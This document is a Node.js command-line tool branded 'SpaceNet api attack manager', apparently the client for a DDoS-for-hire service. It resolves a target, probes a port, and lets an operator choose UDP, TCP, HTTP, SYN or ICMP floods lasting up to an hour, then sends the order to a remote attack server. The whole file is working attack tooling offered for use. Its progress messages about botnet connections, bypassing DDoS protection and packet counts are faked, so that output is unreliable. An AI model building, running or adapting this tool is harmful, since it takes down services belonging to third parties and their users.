import readline from "readline";
import axios from "axios";
import chalk from "chalk";
import gradient from "gradient-string";
import crypto from "crypto";
import os from "os";
import { performance } from "perf_hooks";

console.clear();

const banner = `
   ███████╗██████╗  █████╗  ██████╗███████╗    ███╗   ██╗███████╗████████╗
   ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝    ████╗  ██║██╔════╝╚══██╔══╝
   ███████╗██████╔╝███████║██║     █████╗      ██╔██╗ ██║█████╗     ██║   
   ╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝      ██║╚██╗██║██╔══╝     ██║   
   ███████║██║     ██║  ██║╚██████╗███████╗    ██║ ╚████║███████╗   ██║   
   ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝   
`;

console.log(gradient.rainbow(banner));
console.log(gradient.pastel("                    made by spacevin"));
console.log(gradient.vice("                  api attack manager"));
console.log(gradient.morning("                      version 2.0\n"));

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const generateSessionId = () => crypto.randomBytes(16).toString('hex');
const getSystemInfo = () => ({
    platform: os.platform(),
    arch: os.arch(),
    hostname: os.hostname(),
    uptime: Math.floor(os.uptime()),
    memory: Math.round(os.totalmem() / 1024 / 1024 / 1024)
});

const encryptData = (data, key) => {
    const cipher = crypto.createCipher('aes192', key);
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
};

const calculateLatency = async (host) => {
    const start = performance.now();
    try {
        await axios.get(`http://${host}`, { timeout: 3000 });
        return Math.round(performance.now() - start);
    } catch {
        return null;
    }
};

const resolveTarget = async (target) => {
    const ipRegex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (ipRegex.test(target)) {
        return { ip: target, domain: null };
    }
    
    try {
        const response = await axios.get(`https://dns.google/resolve?name=${target}&type=A`);
        const ip = response.data.Answer?.[0]?.data;
        return { ip: ip || null, domain: target };
    } catch {
        return { ip: null, domain: target };
    }
};

const checkPortStatus = async (host, port) => {
    try {
        const response = await axios.get(`http://${host}:${port}`, { 
            timeout: 2000,
            validateStatus: () => true 
        });
        return response.status;
    } catch (error) {
        if (error.code === 'ECONNREFUSED') return 'closed';
        if (error.code === 'ETIMEDOUT') return 'filtered';
        return 'unknown';
    }
};

const typeText = async (text, delay = 25) => {
    for (let char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    console.log();
};

const showProgress = async (text, duration = 1500) => {
    const frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
    let i = 0;
    
    const interval = setInterval(() => {
        process.stdout.write(`\r${gradient.cristal(frames[i % frames.length] + ' ' + text)}`);
        i++;
    }, 100);
    
    await sleep(duration);
    clearInterval(interval);
    process.stdout.write('\r' + ' '.repeat(50) + '\r');
};

const matrixRain = async (duration = 2000) => {
    const chars = '01';
    const width = process.stdout.columns || 80;
    const height = 10;
    
    const matrix = Array(height).fill().map(() => Array(width).fill(' '));
    
    const startTime = Date.now();
    while (Date.now() - startTime < duration) {
        for (let col = 0; col < width; col += 3) {
            if (Math.random() > 0.7) {
                for (let row = 0; row < height; row++) {
                    matrix[row][col] = chars[Math.floor(Math.random() * chars.length)];
                }
            }
        }
        
        console.clear();
        console.log(gradient.rainbow(banner));
        matrix.forEach(row => {
            console.log(gradient.green(row.join('')));
        });
        
        await sleep(100);
    }
    console.clear();
    console.log(gradient.rainbow(banner));
};

const validateInput = {
    username: (input) => input.length >= 3 && /^[a-zA-Z0-9_]+$/.test(input),
    key: (input) => input.length >= 16 && /^[a-fA-F0-9]+$/.test(input),
    target: (input) => /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(input),
    port: (input) => {
        const port = parseInt(input);
        return port >= 1 && port <= 65535;
    },
    method: (input) => ['udp', 'tcp', 'http', 'https', 'syn', 'icmp'].includes(input.toLowerCase()),
    time: (input) => {
        const time = parseInt(input);
        return time >= 10 && time <= 3600;
    }
};

const methods = {
    'udp': { name: 'udp flood', power: 85, description: 'raw packet spam' },
    'tcp': { name: 'tcp flood', power: 90, description: 'connection overload' },
    'http': { name: 'http flood', power: 75, description: 'web server stress' },
    'https': { name: 'https flood', power: 80, description: 'encrypted overload' },
    'syn': { name: 'syn flood', power: 95, description: 'half-open connections' },
    'icmp': { name: 'icmp flood', power: 70, description: 'ping of death' }
};

const apiManager = async () => {
    const sessionId = generateSessionId();
    const systemInfo = getSystemInfo();
    
    const prompt = (query, validator = null, hidden = false) => {
        return new Promise((resolve) => {
            const ask = () => {
                if (hidden) {
                    process.stdout.write(gradient.morning(query + " "));
                    process.stdin.setRawMode(true);
                    process.stdin.resume();
                    
                    let input = '';
                    const onData = (char) => {
                        if (char === '\r' || char === '\n') {
                            process.stdin.setRawMode(false);
                            process.stdin.pause();
                            process.stdin.removeListener('data', onData);
                            console.log();
                            
                            if (validator && !validator(input)) {
                                console.log(chalk.red("invalid input, try again"));
                                ask();
                            } else {
                                resolve(input);
                            }
                        } else if (char === '\u0003') {
                            process.exit();
                        } else if (char === '\u007f') {
                            if (input.length > 0) {
                                input = input.slice(0, -1);
                                process.stdout.write('\b \b');
                            }
                        } else {
                            input += char;
                            process.stdout.write('*');
                        }
                    };
                    
                    process.stdin.on('data', onData);
                } else {
                    rl.question(gradient.morning(query + " "), (answer) => {
                        if (validator && !validator(answer)) {
                            console.log(chalk.red("invalid input, try again"));
                            ask();
                        } else {
                            resolve(answer);
                        }
                    });
                }
            };
            ask();
        });
    };

    try {
        await matrixRain(1500);
        await typeText(gradient.summer("initializing attack manager..."), 30);
        
        console.log(gradient.vice("\nsystem information:"));
        console.log(`session: ${chalk.cyan(sessionId.substring(0, 8))}`);
        console.log(`platform: ${chalk.yellow(systemInfo.platform)} ${systemInfo.arch}`);
        console.log(`memory: ${chalk.green(systemInfo.memory)}gb available`);
        console.log(`uptime: ${chalk.blue(Math.floor(systemInfo.uptime / 3600))}h`);

        console.log(gradient.vice("\nauthentication required"));
        const username = await prompt("username:", validateInput.username);
        const apiKey = await prompt("api key:", validateInput.key, true);

        await showProgress("verifying credentials...", 1200);
        
        const hashedKey = crypto.createHash('sha256').update(apiKey + username).digest('hex');
        console.log(chalk.green("authentication successful"));
        console.log(`token: ${chalk.dim(hashedKey.substring(0, 16))}`);

        console.log(gradient.cristal("\ntarget reconnaissance"));
        const target = await prompt("target ip/domain:", validateInput.target);
        
        await showProgress("resolving target...", 800);
        const resolved = await resolveTarget(target);
        
        if (resolved.ip) {
            console.log(`resolved: ${chalk.red(resolved.ip)}`);
            if (resolved.domain) {
                console.log(`domain: ${chalk.yellow(resolved.domain)}`);
            }
            
            const latency = await calculateLatency(resolved.ip);
            if (latency) {
                console.log(`latency: ${chalk.green(latency)}ms`);
            }
        } else {
            console.log(chalk.red("failed to resolve target"));
        }

        const port = await prompt("target port:", validateInput.port);
        
        await showProgress("scanning port...", 600);
        const portStatus = await checkPortStatus(resolved.ip || target, port);
        console.log(`port ${port}: ${chalk.cyan(portStatus)}`);

        console.log(gradient.fruit("\nattack configuration"));
        console.log("available methods:");
        Object.entries(methods).forEach(([method, info]) => {
            const powerBar = '█'.repeat(Math.floor(info.power / 10)) + '░'.repeat(10 - Math.floor(info.power / 10));
            console.log(`  ${chalk.cyan(method.padEnd(6))} ${gradient.rainbow(powerBar)} ${info.power}% - ${info.description}`);
        });

        const method = await prompt("attack method:", validateInput.method);
        const time = await prompt("duration (10-3600s):", validateInput.time);
        
        const selectedMethod = methods[method.toLowerCase()];
        const estimatedPower = Math.floor(selectedMethod.power * (parseInt(time) / 60));

        console.log(gradient.atlas("\n" + "═".repeat(50)));
        console.log(gradient.atlas("attack summary"));
        console.log(gradient.atlas("═".repeat(50)));
        console.log(`session: ${chalk.dim(sessionId.substring(0, 8))}`);
        console.log(`operator: ${chalk.yellow(username)}`);
        console.log(`target: ${chalk.red((resolved.ip || target) + ":" + port)}`);
        console.log(`method: ${chalk.magenta(selectedMethod.name)}`);
        console.log(`duration: ${chalk.green(time + "s")}`);
        console.log(`estimated power: ${chalk.red(estimatedPower + "%")}`);
        console.log(gradient.atlas("═".repeat(50)));

        const confirm = await prompt("launch attack? (y/n):");
        if (confirm.toLowerCase() !== 'y') {
            console.log(chalk.yellow("attack aborted by operator"));
            return;
        }

        await showProgress("preparing attack vectors...", 900);
        await showProgress("establishing botnet connections...", 1100);
        await showProgress("bypassing ddos protection...", 800);
        await showProgress("spoofing source addresses...", 700);

        const apiUrl = `http://spaaacelink/apissaa/attack`;
        const encryptedPayload = encryptData(JSON.stringify({
            username: username,
            key: apiKey,
            host: resolved.ip || target,
            port: port,
            time: time,
            method: method.toLowerCase(),
            session: sessionId
        }), hashedKey);

        const params = {
            payload: encryptedPayload,
            checksum: crypto.createHash('md5').update(encryptedPayload).digest('hex')
        };

        console.log(gradient.morning("\napi endpoint:"));
        console.log(chalk.dim(`${apiUrl}`));
        console.log(`payload size: ${chalk.cyan(encryptedPayload.length)} bytes`);

        console.log(gradient.cristal("\nlaunching attack sequence..."));

        const progressBar = async () => {
            const total = 30;
            for (let i = 0; i <= total; i++) {
                const percent = Math.round((i / total) * 100);
                const filled = '█'.repeat(i);
                const empty = '░'.repeat(total - i);
                const color = i < 10 ? 'red' : i < 20 ? 'yellow' : 'green';
                process.stdout.write(`\r${gradient[color](`[${filled}${empty}] ${percent}%`)}`);
                await sleep(100);
            }
            console.log();
        };

        await progressBar();

        const startTime = performance.now();
        const response = await axios.post(apiUrl, params, { 
            timeout: 10000,
            headers: {
                'User-Agent': 'SpaceNet/2.0',
                'X-Session-ID': sessionId,
                'X-Timestamp': Date.now()
            }
        });
        const responseTime = Math.round(performance.now() - startTime);

        if (response.data) {
            console.log(gradient.fruit("\nserver response:"));
            console.log(chalk.green("═".repeat(40)));
            console.log(`response time: ${chalk.cyan(responseTime)}ms`);
            
            if (typeof response.data === 'object') {
                Object.entries(response.data).forEach(([key, value]) => {
                    console.log(`${chalk.cyan(key)}: ${chalk.white(value)}`);
                });
            } else {
                console.log(chalk.white(response.data));
            }
            
            console.log(chalk.green("═".repeat(40)));

            if (response.data.status === 'success' || response.data.success) {
                console.log(gradient.rainbow("\nattack launched successfully"));
                console.log(gradient.passion(`${selectedMethod.name} initiated against ${resolved.ip || target}`));
                
                let remaining = parseInt(time);
                let packetsEstimate = 0;
                
                console.log();
                const countdown = setInterval(() => {
                    packetsEstimate += Math.floor(Math.random() * 10000) + 5000;
                    const progress = Math.round(((parseInt(time) - remaining) / parseInt(time)) * 100);
                    
                    process.stdout.write(`\r${gradient.cristal(`attack progress: ${progress}% | packets sent: ~${packetsEstimate.toLocaleString()} | ${remaining}s remaining`)}`);
                    remaining--;
                    
                    if (remaining < 0) {
                        clearInterval(countdown);
                        console.log(gradient.morning("\n\nattack sequence completed"));
                        console.log(gradient.pastel(`total packets sent: ~${packetsEstimate.toLocaleString()}`));
                        console.log(gradient.vice("target neutralized"));
                    }
                }, 1000);
            } else {
                console.log(chalk.red("attack failed to initialize"));
                if (response.data.error) {
                    console.log(chalk.red(`error: ${response.data.error}`));
                }
            }
        } else {
            console.log(chalk.red("no response from command server"));
        }

    } catch (error) {
        console.log(gradient.passion("\noperation failed"));
        
        if (error.code === 'ECONNABORTED') {
            console.log(chalk.red("connection timeout - server overloaded"));
        } else if (error.response) {
            console.log(chalk.red(`server error: ${error.response.status} ${error.response.statusText}`));
            if (error.response.data) {
                console.log(chalk.red(`details: ${JSON.stringify(error.response.data)}`));
            }
        } else if (error.request) {
            console.log(chalk.red("network unreachable - check connection"));
        } else {
            console.log(chalk.red(`system error: ${error.message}`));
        }
    } finally {
        console.log(gradient.pastel("\nspace network session terminated"));
        console.log(gradient.vice("stay in the shadows"));
        rl.close();
    }
};

process.on('SIGINT', () => {
    console.log(gradient.rainbow("\n\nforced shutdown"));
    process.exit(0);
});

console.log(gradient.mind("loading system modules..."));
await sleep(1000);

apiManager();
